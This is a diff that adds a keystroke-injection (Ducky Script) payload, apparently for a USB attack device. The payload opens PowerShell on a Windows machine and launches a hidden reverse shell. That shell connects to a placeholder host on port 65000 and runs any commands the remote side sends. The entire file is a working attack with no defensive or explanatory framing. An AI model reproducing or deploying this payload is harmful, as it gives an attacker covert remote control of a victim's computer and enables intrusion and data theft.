@@ -1,0 +1,14 @@
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell 
+ENTER
+DELAY 300
+STRING $script = { $client = New-Object System.Net.Sockets.TCPClient('X.X.X.X',65000);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
+ENTER
+DELAY 300
+STRING Start-Process -WindowStyle hidden powershell -ArgumentList "-command invoke-command -scriptblock {$script}"
+ENTER
+DELAY 300
+STRING exit
+ENTER
